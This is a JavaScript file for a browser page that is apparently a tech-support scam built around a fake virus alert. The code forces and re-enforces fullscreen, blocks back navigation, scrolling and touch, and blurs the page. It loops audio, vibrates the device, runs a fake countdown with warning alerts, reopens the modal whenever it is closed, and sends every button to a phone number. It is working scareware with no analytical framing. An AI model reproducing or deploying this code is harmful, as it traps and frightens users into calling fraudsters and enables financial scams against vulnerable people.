$(document).ready(() => {
  // Function to start the countdown timer
  function startCountdown() {
    let timeInSeconds = 5 * 60; // 5 minutes in seconds

    const countdown = setInterval(() => {
      let minutes = Math.floor(timeInSeconds / 60);
      let seconds = timeInSeconds % 60;

      // Format minutes and seconds to always show 2 digits
      minutes = minutes < 10 ? "0" + minutes : minutes;
      seconds = seconds < 10 ? "0" + seconds : seconds;

      // Update the timer display
      document.getElementById("countdown-timer").innerText = `${minutes}:${seconds}`;

      // Decrease time by 1 second
      timeInSeconds--;

      // Show a warning when 1 minute remains
      if (timeInSeconds === 60) {
        alert("Warning: Only 1 minute remaining to address the issue!");
      }

      // When the countdown reaches 0, restart the timer
      if (timeInSeconds < 0) {
        clearInterval(countdown);
        startCountdown(); // Restart the countdown
      }
    }, 1000);
  }

  // Start the countdown timer
  startCountdown();

  const virusModal = document.getElementById("virusModal");
  const modalInstance = new bootstrap.Modal(virusModal);
  const audioPlayer = $("#audioPlayer")[0];

  // Function to loop audio playback
  function playAudioLoop() {
    audioPlayer.play();
    audioPlayer.addEventListener("ended", () => {
      audioPlayer.play();
    });
  }

  playAudioLoop();

  // Function to enable fullscreen and vibrate
  function goFullScreenAndVibrate() {
    const element = document.documentElement; // Use the whole document for fullscreen

    if (element.requestFullscreen) {
      element.requestFullscreen();
    } else if (element.mozRequestFullScreen) {
      element.mozRequestFullScreen();
    } else if (element.webkitRequestFullscreen) {
      element.webkitRequestFullscreen();
    } else if (element.msRequestFullscreen) {
      element.msRequestFullscreen();
    }

    navigator.vibrate([200, 100, 200]); // Custom vibration pattern
    modalInstance.show(); // Show the modal
  }

  // Function to prevent scrolling and touch interactions
  function disableUserInteractions() {
    $("body").css({
      overflow: "hidden",
      position: "fixed",
      touchAction: "none",
    });
  }

  disableUserInteractions();

  // Function to blur background content
  function blurBackground() {
    $("body > :not(.modal)").css({
      filter: "blur(5px)",
      pointerEvents: "none",
    });
  }

  blurBackground();

  // Detect when the user exits fullscreen and force re-entry
  document.addEventListener("fullscreenchange", () => {
    if (!document.fullscreenElement) {
      goFullScreenAndVibrate();
    }
  });

  // Prevent back navigation
  history.pushState(null, null, window.location.href);
  window.onpopstate = () => history.forward();

  // Add event listeners for touch and click to enforce fullscreen
  window.addEventListener("touchstart", goFullScreenAndVibrate);
  window.addEventListener("click", goFullScreenAndVibrate);

  // Handle modal behavior
  if (virusModal) {
    virusModal.addEventListener("hidden.bs.modal", () => {
      setTimeout(() => {
        modalInstance.show();
        goFullScreenAndVibrate();
      }, 300); // 0.3 second delay
    });
  }

  // Handle button clicks to initiate phone calls
  $("#callButton, #callButton1, #callButton2").on("click", () => {
    window.location.href = "tel:+18778381219";
  });

  // Detect device shake using the DeviceMotion API
  window.addEventListener("devicemotion", (event) => {
    const acceleration = event.accelerationIncludingGravity;
    if (acceleration.x > 15 || acceleration.y > 15 || acceleration.z > 15) {
      goFullScreenAndVibrate();
      alert("Device shake detected! Returning to the alert screen.");
    }
  });

  // Screen Wake Lock API to prevent screen sleep
  if ("wakeLock" in navigator) {
    navigator.wakeLock.request("screen").catch((err) => {
      console.error("Wake lock error:", err);
    });
  }

  // Handle screen orientation changes
  window.addEventListener("orientationchange", () => {
    alert("Screen rotated! Adjusting to maintain the alert.");
    goFullScreenAndVibrate();
  });
});
